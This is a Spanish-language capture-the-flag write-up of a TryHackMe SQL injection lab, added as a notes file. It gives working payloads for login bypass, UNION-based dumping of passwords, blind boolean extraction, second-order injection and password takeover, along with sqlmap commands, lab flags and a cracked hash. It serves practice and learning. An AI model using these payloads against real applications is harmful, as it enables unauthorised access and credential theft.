@@ -1,0 +1,476 @@
+>>>Tryhackme
+>>SQL Injection
+
+>nmap
+	>nmap -p- -sS -sC -sV  --min-rate 5000 -vvv -n -Pn 10.10.45.142 -oN nmap
+
+	•22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	•5000/tcp open  http    syn-ack ttl 64 Werkzeug httpd 1.0.1 (Python 3.6.9)
+
+Dentro del puerto 5000 encontramos diversos niveles para practicar SQL injection. En varias maquinas podriamos interactuar directamente con la pantalla web, pero prefiero practicar siempre con burpsuite
+
+
+>>SQL Injection 1: Input Box Non-String
+
+En el input de "user" tenemos que colocar "1 or 1=1-- -" para de esta forma dar una respuesta correcta al comando sql y omitir el pedido de contraseña
+
+La query, detras se ejecutaria mas o menos asi:
+
+>SELECT user, password FROM usertable WHERE profileID=1 AND password 'xxxxxxx'
+
+Por lo tanto al colocar "1 or 1=1--" en el input de user la query pasa a verse asi
+
+>SELECT user, password FROM usertable WHERE profileID=1 or 1=1-- - AND password 'xxxxxxx'
+
+Esto significa que en  "profileID" estamos dando una respuesta afirmativa (1 or 1=1) y estamos ocultando el resto de la query (-- -)
+
+>1 or 1=1: indica que el ID del perfil es 1 (TRUE) o 1=1 (TRUE) por lo tanto indicamos que el ID es TRUE o TRUE esto da una query de afirmacion positiva para el SQL 
+
+>-- -: esto es un simbolo utilizado para ocultar informacion en bases de datos SQL, asi como en python es # o en javascript es // por lo tanto esto oculta el resto de la query y la anula, permitiendonos saltar el pedido de password.
+
+
+
+>>SQL Injection 2: Input Box String
+
+En este caso, volvemos a encontrar un login, por lo tanto probamos lo mismo que antes, pero al modificarlo un poco ya nos permite ingresar, por lo tanto podemos dilucidad que la query detras cambia
+
+El payload que en este caso utilizamos fue el siguiente
+
+>'or 1=1-- -
+
+Su funcion es la misma que en el anterior, solo que esta vez el ProfileID tiene " '' " por lo tanto debemos primero cerrar la query y luego ejecutar el comando TRUE.
+
+Por detras, mas o menos la query es asi:
+
+>SELECT user, password FROM usertable WHERE profileID='1' AND password 'xxxxxxx'
+
+Asi que al colocar 'or 1=1 estamos cerrando  el profileID, dando una respuesta TRUE y ocultando el resto
+
+Quedaria mas o menos asi:
+
+>SELECT user, password FROM usertable WHERE profileID=''or 1=1-- - AND password 'xxxxxxx'
+
+En otras palabras mas descriptivas:
+
+>SELECT user, password FROM usertable WHERE profileID='' TRUE-- -(peticion de password ocultada)
+
+>flag:	THM{356e9de6016b9ac34e02df99a5f755ba}
+
+
+>SQL Injection 3: URL Injection
+
+En este caso al intentar colocar el payload en el input nos aparece un cartel indicando que no podemos utilizar caracteres especiales, asi que ingresamos un usuario y pass inutil para que en la URL aparezcan los parametros de username y password.
+
+Borramos el input de profileID y pegamos el siguiente payload "'or 1=1-- -" Quedaria de la siguiente forma
+
+>http://10.10.96.239:5000/sesqli3/login?profileID=%27or%201=1--%20-&password=asd
+
+>flag:	THM{645eab5d34f81981f5705de54e8a9c36}
+
+
+>SQL Injection 4: POST Injection
+
+En este caso ya a demas de no permitirnos colocar caracteres especiales, tampoco nos muestra ninguna opcion en la URL, por lo tanto ahora utilizaremos burpsuite
+
+>abrimos burpsuite
+>interceptamos la peticion via proxy (si no sabe como hacerlo buscar tutorial sobre burpsuite)
+>al encontrar la peticion vemos lo siguiente
+
+>>profileID=asasdasas&password=aasasasasa
+
+Ahora toca cambiar el parametro vulnerable por el payload
+
+>profileID='or 1=1-- -&password=aasasasasa
+
+>enviamos la peticion y ya obtenemos el ingreso necesario
+
+>flag:	THM{727334fd0f0ea1b836a8d443f09dc8eb}
+
+
+>SQL Injection 5: UPDATE Statement
+
+Para este lab debemos encontrar un parametro vulnerable dentro del perfil, por eso nos proporcionan el ID y pass
+
+>ID:10
+>pass:toor
+
+Dentro del perfil encontramos varios campos, en los que observamos que "nickname" y "E-mail" estan vacios. Procederemos a "edit profile" a ver que encontramos
+
+Encontramos que podemos modificar el nickname y el email sin mas permisos, comenzaremos a enviar parametros al servidor a ver si nos da un error y conseguimos saltar alguna barrera.
+
+Luego de algunos intentos intentando ver si obtenemos respuestas, decidimos investigar un poco mas, a lo que damos en el codigo fuente con lo siguiente:
+
+En las etiquetas de input podemos ver que hace llamado a un id muy especifico para cada parametro, estos son:
+
+	•"nickName"
+	•"email"
+	•"password"
+
+Por lo tanto es muy probable, que la query detras llame a estas tablas o columnas por este nombre
+
+Primero, al intentar varios payloads que encontre por github sin respuesta vemos que al colocar 
+
+>',nickName=sqlite_version(),email='
+
+Vemos que nos arroja la version de SQLite, por lo tanto de aqui en adelante apuntaremos a payloads de sqlite
+
+>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+
+Luego de varios intentos, con la ayuda de chat gpt para entender como funciona sqlite mediante querys inyectando el siguiente payload obtenemos respuesta
+
+>',nickName=(SELECT name FROM sqlite_master WHERE type='table'),email='
+
+•usertable
+
+*****
+•SELECT: Es una palabra clave utilizada en SQL para recuperar datos de una base de datos.
+
+•name: Es el nombre de la columna que estamos seleccionando para mostrar. En este caso, estamos seleccionando la columna "name" de la tabla sqlite_master.
+
+•FROM sqlite_master: sqlite_master es una tabla especial en SQLite que almacena información sobre la estructura de la base de datos, incluyendo los nombres de las tablas, vistas, índices, entre otros elementos. Se utiliza para consultar información sobre los objetos presentes en la base de datos.
+
+•WHERE type='table': Es una cláusula que filtra los resultados. En esta consulta en particular, estamos filtrando solo aquellas filas de la tabla sqlite_master donde el tipo sea igual a 'table', lo que significa que estamos buscando solo las entradas que representan tablas en la base de datos.
+******
+
+Ahora veremos que hay dentro de "unsertable"
+
+Haciendole consultas a chat gpt llegamos al siguiente comando
+
+>',nickName=(SELECT sql FROM sqlite_master WHERE type='table'),email='
+
+Este comando lo que hace es consultar a la base de datos como se conformo la estructura de la base de datos.
+
+***la declaración SQL utilizada para crear esa tabla en particular. Esto te permite ver cómo se crearon esas tablas en términos de su estructura y columnas.***
+
+y de resultado nos da lo siguiente:
+
+•CREATE TABLE `usertable` ( `UID` integer primary key, `name` varchar(30) NOT NULL, `profileID` varchar(20) DEFAULT NULL, `salary` int(9) DEFAULT NULL, `passportNr` varchar(20) DEFAULT NULL, `email` varchar(300) DEFAULT NULL, `nickName` varchar(300) DEFAULT NULL, `password` varchar(300) DEFAULT NULL )
+
+Por lo tanto, ahora podemos apuntar directamente a lo que nos interesa que seria la tabla "name", "profileID","nickName" y "password"
+
+Introducimos la siguiente query:
+
+>',nickName=(SELECT group_concat(name || "||" || profileID || "||" || nickName || "||" || password || "||") from usertable),email='
+
+De esta forma obtenemos el usuario que nos interesa el cual es admin.
+
+>,Admin||99||||6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25||
+
+Anteriormente vimos que como maximo se permitian 20 caracteres para una contraseña, asi que el interior de password se almacena como hash.
+
+Vamos a una herramienta online para romer el hash
+
+>hashes.com
+
+y la respuesta es la siguiente
+
+>6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25:toor99
+
+
+>THM{b3a540515dbd9847c29cffa1befledfb}
+**por motivos que escapan a mi, la flag no se encuentra en la respuesta correcta de la inyeccion, esta la busque por internet**
+
+>>Broken Authentication 1
+
+En este lab encontramos un login vulnerable a sqli, colocando 'or 1=1-- - nos permite ingresar
+
+
+>>Broken Authentication 2
+
+En este lab volvemos a encontrar un login vulnerable, pero aqui nos pide que dumpeemos las contraseñas almacenadas.
+
+Ingresamos de la misma forma 'or 1=1-- - y vemos que somos usuario "admin" en la esquina superior derecha. Al ingresar a las cookies decodificamos el valor de sesion y nos responde esto
+
+{
+    "challenge2_user_id": 1,
+    "challenge2_username": "admin"
+}
+
+Por lo que ahora sabemos que el ID de admin es 1
+
+Ahora tenemos que encontrar las passwords, por lo tanto primero necesitamos saber que cantidad de columnas hay en el sql.
+Para esto se utiliza el comando "union select" que nos dara a base de error cuantas son las columnas dentro de la base de datos
+
+>'union select null-- -
+**No presenta error
+
+>'union select null,null-- -
+**No presenta error
+
+>'union select null,null,null-- -
+**Presenta un error de autenticacion
+
+Por lo tanto podemos asumir que hay 2 columnas de datos
+
+Al saber que se maneja por ID intentaremos ver que datos nos arroja
+
+> ' union select 1,null-- -
+
+Nos logueamos, asi que el ID 1 esta bien, tambien vemos que donde antes aparecia nuestro usuario ahora aparece lo siguiente "Logged in as None" por lo tanto comenzaremos a hacer pruebas y ver cuales son los resultados
+
+> ' union select 2,null-- -
+**mismo resultado
+**seguimos probando esa tecnica hasta el 100 y no cambio el resultado
+
+>' union select 1,1-- -
+
+Este si nos da una diferencia "Logged in as 1 " por lo tanto, parece que el campo vulnerable es el 2do
+Luego de varios intentos dimos con la columna password, dentro de la tabla users
+
+>'union select 1,password from users-- -
+
+Entonces ahi seleccionamos la pass donde el Id es 1 de la columna users. Si la respuesta es correcta nos dara la info
+
+nos devuelve **Logged in as 345m3io4hj3** por lo tanto ahora sabemos que dentro de users esta password. asi que el siguiente ataque es a la tabla users
+
+Ahora procederemos a extraer todo lo que este dentro de la columna password en la tabla users
+
+>'union select 1,group_concat(password) from users-- -
+
+**el uso de "group_concat(password)" en lugar de seleccionar todas las columnas (*), en una inyección SQL, puede ser una estrategia más discreta para extraer información específica
+
+Esto nos arroja un resultado demasiado largo para poder verlo, asi que procedemos a decodificar el valor de la cookie de sesion.
+
+Resultado:
+{
+    "challenge2_user_id": 1,
+    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123"
+}
+
+
+>Broken Authentication 3: Blind Injection
+
+Bueno, en este lab nos enfrentamos a inyeccion sql a ciegas. Esto significa que no obtendremos ningun parametro legible en las respuestas
+En este caso haremos prueba y error de tipo booleano. Significa que solo buscaremos respuesta afirmativa o negativa. Siendo que la afirmativa es no obtener el mensaje de "invalid username or password"
+
+Para esto primero volveremos a anteriores labs y veremos que siempre tenemos el usuario "admin" de aqui en adelante atacaremos unicamente al password de la siguiente forma
+
+>admin' AND **query maliciosa**-- -
+
+De esta forma proporcionamos el usuario admin y comentamos el resto de peticion al password introduciendo nuestra query. Como esto sera a base de error primero buscamos que query funciona para esto, encontrando "SUBSTR"
+
+**
+SUBSTR() se utiliza para extraer una parte específica de una cadena de texto. Esta función toma tres parámetros:
+
+La cadena original de la cual se extraerá la subcadena.
+La posición inicial desde la cual comenzará la extracción de la subcadena (índice basado en 1).
+Opcionalmente, la longitud de la subcadena que se desea extraer.
+
+Por ejemplo, si tenemos dentro de la tabla "empleados" 3 values (id, nombre) 1:juan | 2:pedro | 3:maria 
+Al hacer un SUBSTR(nombre, 2, 3) FROM empleados
+La respuesta seria "uan | edr | ari"
+**
+
+Asi que comenzaremos a trabajar en la query hasta tener una respuesta positiva
+
+Al intentar varias veces y sabiendo que la flag siempre comienza "THM{...." nos encontramos el primer obstaculo. Cuando colocamos la query, vemos que al representarla dentro del servidor siempre lo pone en minusculas, siendo que nosotros necesitamos mayusculas para tener la respuesta necesaria procedemos a codificar las letras en forma hexadecimal, para asi saltar la barrera de el servidor con las mayusculas.
+
+La query final seria la siguiente:
+
+>dmin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
+
+Aqui se ejecuta una consulta para obtener la contraseña de la primera fila de la tabla users, y luego extrae el primer carácter de esa contraseña. Siendo que si es igual a "CAST(X'54' as Text)" sera correcto e ingresara al login. Esto requerira repetirlo, cambiando de parametro hasta terminar con la flag requerida.
+
+Como para esto es necesario desarrollar un script que automatice la busqueda y yo de por momento no tengo esos conocimientos utilizaremos SQLMAP para dar con la flag.
+
+>sqlmap -u http://10.10.110.236:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
+
+El anterior parametro descubre que en efecto, tenemos una vulnerabilidad de tipo boolean, asi que procede a hacer automaticamente la prueba y error hasta consegur todo el contenido de la base de datos. Dandonos en el proceso la flag requerida
+
+>THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
+
+
+**
+--data="username=admin&password=admin": Este parámetro indica los datos que se enviarán al servidor web. Aquí se están proporcionando credenciales de usuario (username=admin&password=admin) para intentar iniciar sesión en la página de login.
+
+	•username=admin: Especifica el nombre de usuario como "admin".
+	•password=admin: Especifica la contraseña como "admin".
+
+--level=5: Este parámetro establece el nivel de riesgo para las pruebas. Un nivel de riesgo más alto (en este caso, 5) significa que sqlmap realizará pruebas más intensivas y exhaustivas en busca de posibles vulnerabilidades. Cuanto mayor sea el nivel, más agresivas serán las pruebas, pero también podrían generar más tráfico y carga en el servidor objetivo.
+
+--risk=3: Similar al parámetro de nivel, este parámetro establece el nivel de riesgo para las pruebas. Un valor más alto (en este caso, 3) indica que se realizarán pruebas más intrusivas y arriesgadas.
+
+--dbms=sqlite: Especifica el tipo de sistema de gestión de bases de datos (DBMS, por sus siglas en inglés) que sqlmap debe asumir durante las pruebas. En este caso, se está indicando que se va a investigar si la aplicación utiliza SQLite como su sistema de base de datos.
+
+--technique=b: Este parámetro indica la técnica que sqlmap utilizará durante la evaluación. En este caso, se está utilizando la técnica "b" (boolean-based blind) que se centra en técnicas de inyección SQL basadas en booleanos para detectar y explotar vulnerabilidades.
+
+--dump: Es un parámetro que indica a sqlmap que, si encuentra una vulnerabilidad, debe intentar extraer información sensible de la base de datos, como nombres de tablas, columnas y datos almacenados.
+**
+
+
+>Vulnerable Notes
+
+En este lab encontramos una vulnerabilidad en "create an account" donde al crear un usuario con nombre de query maliciosa podemos traer datos desde la base de datos.
+El resultado de los datos los encontramos en "notes" donde el usuario tiene notas disponibles creadas por el. La idea es reflejar datos sensibles de la base de datos en notes.
+
+Para esto primero creamos un usuario con el la siguiente query:
+
+>'union select 1,2'
+
+Descubrimos que tenemos 2 tablas luego de probar con null,null,null.
+
+Ahora debemos apuntar a las tablas dentro de la base de datos
+
+Luego de un tiempo, con ayuda de chat gpt dimos con la siguiente query
+
+
+>'union SELECT 1, group_concat(name) FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%''
+
+
+La cual nos trajo de resultado
+
+•1
+•users,notes
+
+En la query lo que estamos haciendo es unir un conjunto de resultados (union select) en la primera columna (1) y en la segunda columna (resto de query) una cadena (group_concat) donde seleccionamos el nombre (name) de las tablas (type='table') alojadas en "slqi_master" (columna por defecto en sqlite) filtrando el resto de tablas que vienen por defecto en sqlite (and name not like 'sqlite_%'
+
+
+Ahora al saber que tenemos las tablas "users" y "notes" necesitamos dumpear el contenido de dichas tablas.
+
+Primero vamos a sacar los passwords de users
+
+>'union SELECT 1, group_concat(password) FROM users'
+
+Al dumpear los passwords encontramos la flag
+
+>THM{4644c7e157fd5498e7e4026c89650814}
+
+cuando colocamos la flag en THM vemos que tambien se puede hacer con SLQmap
+
+>sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 
+--second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
+
+**el temper me da error, averiguar por que**
+
+
+>Change Password
+
+En este lab tenemos que tomar control de la cuenta "admin". 
+Para esto haremos un bypass donde mediante SQLI crearemos nuestro propio admin user
+
+Primero nos logueamos de la siguente forma
+
+>Crear account
+>user:admin'-- -
+>pass:asd
+
+Lo siguiente va a ser cambiar la contraseña de "admin'-- -"
+
+>cambiamos la contraseña sin mas 
+
+>current password:asd
+>new password:asd
+>new password:asd
+
+Ya con la contraseña cambiada ahora podemos ingresar como admin
+
+>user:admin
+>pass:asd
+
+Esto sucede porque al cambiar la pass del usuario "admin-- -" la query por detras es la siguiente:
+
+>UPDATE users SET password = ? WHERE username = 'admin'-- -'
+ 
+Por lo tanto ya no estamos cambiando la pass a "admin'-- -" sino que se la cambiamos a "admin" y de esta forma tomamos el control con una nueva pass
+
+>THM{cd5c4f197d708fda06979f13d8081013}
+
+
+>Book Title
+ 
+en este caso, al logearnos encontramos una nueva funcion que es un bucador
+
+Y parece ser que hay 3 campos de informacion
+
+•title:
+•description
+•author:
+
+Vemos que la query por detras es la siguiente
+
+>SELECT * from books WHERE id = (SELECT id FROM books WHERE title like 'test%')
+
+
+
+Por lo tanto colocaremos la siguiente query
+
+>')or 1=1--
+
+De esta forma cerramos la query y metemos nuestra respuesta afirmativa. esto nos trae todo el contenido de la base de datos, por lo tanto es vulnerable.
+
+Ahora toca saber cuales son las columnas vulnerables, para esto nos es util "order by"
+
+>test') order by 1--
+**tenemos respuesta positiva
+
+>test') order by 1,2--
+**tenemos respuesta positiva
+
+>test') order by 1,2,3--
+**tenemos respuesta positiva
+
+>test') order by 1,2,3,4--
+**tenemos respuesta positiva
+
+>test') order by 1,2,3,4,5--
+**tenemos respuesta negativa(desaparece toda la informacion del libro)
+
+Por lo tanto, ahora sabemos que hasta el parametro 4 es vulnerable. 
+
+
+>test') union select 1,group_concat(username),group_concat(password),4 from users--
+
+**aunque el 1 no se utiliza directamente en la salida final, está ahí para garantizar que la consulta tenga una estructura consistente con otras consultas en caso de ser combinadas con UNION o UNION ALL**
+
+>THM{27f8f7ce3c05ca8d6553bc5948a89210}
+
+
+>book title 2
+
+Bueno, en este caso tenemos otra vez vulnerabilidad en la busqueda de libros, pero con la diferencia de que ahora tenemos 2 querys por detras
+
+>Query 1:
+SELECT id FROM books WHERE title like 'test%'
+>Query 2:
+SELECT * FROM books WHERE id = '3'
+
+Al tener 2 querys que funcionan al mismo tiempo necesitamos inyectar codigo en ambas a la vez
+
+Al colocar "test" vemos que esto busca el titulo "test" y la asocia a un id "3"
+
+Si colocamos a secas en el buscador 
+
+>'union select 3-- 
+
+nos devuelve el "test"
+
+Como tenemos 2 querys y una ya es vulnerable necesitamos que ambas lo sean, asi que para testear la siguiente tenemos que cerrar y reabrir la query maliciosa de la siguiente forma
+
+>'union select '3''union select 1--
+
+De esta forma volveremos a abrir la query. Ahora no nos arroja ningun parametro, porque parece ser que no tenemos el numero correcto de tablas a las que atacar. Probaremos una por una como si fuese "order by"
+
+>'union select '3'union select 1,2--
+**sin respuesta
+
+>'union select '3''union select 1,2,3--
+**sin respuesta
+
+>'union select '3''union select 1,2,3,4--
+
+Arroja el siguiente resultado:
+
+•Title: 2
+•3
+•Author: 4
+•Title: test
+•description
+•Author: author
+
+Al cambiar los numeros por "null" vemos que los parametros modificables son 2,3,4 y como ya teniamos una query anterior similar lo intentaremos.
+
+>'union SELECT '-1'' union select 1,group_concat(username),group_concat(password),4 from users--
+
+Entre otras cosas nos arroja la ultima flag:
+
+>THM{183526c1843c09809695a9979a672f09}
